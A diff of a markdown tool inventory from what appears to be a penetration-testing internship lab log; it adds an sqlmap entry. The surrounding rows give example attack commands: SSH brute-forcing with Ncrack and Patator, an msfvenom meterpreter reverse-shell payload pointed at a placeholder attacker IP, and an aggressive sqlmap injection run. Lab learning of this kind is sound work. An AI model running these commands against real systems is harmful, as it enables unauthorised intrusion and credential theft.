@@ -55,6 +55,7 @@ A running inventory of every tool encountered during the internship, organized b
 | 43 | Patator | Offensive Security | Day 12 | Flexible brute-force automation tool with custom success matching |
 | 44 | MySQL (Server) | Database / Backend | Day 13 | Relational database server version 5.0.51a on Metasploitable 2 |
 | 45 | mysql (Client) | Database / Backend | Day 13 | Terminal-based MySQL client for query execution and schema inspection |
+| 46 | sqlmap | Application Security | Day 14 | Automated SQL injection detection and exploitation framework |
 ---
 
 ## By Category
@@ -129,6 +130,7 @@ A running inventory of every tool encountered during the internship, organized b
 | Ncrack | High-speed network authentication cracker | `ncrack -p ssh,ftp 192.0.2.10` |
 | Patator | Flexible brute-force automation tool with custom success matching | `patator ssh_login host=192.0.2.10 user=FILE0 password=FILE1 0=... 1=...` |
 | msfvenom | Payload generation and encoding | `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f elf -o shell.elf` |
+| sqlmap | Automated SQL injection detection and exploitation | `sqlmap -u "<url>" --forms --batch --risk=3 --level=5` |
 
 ---
 
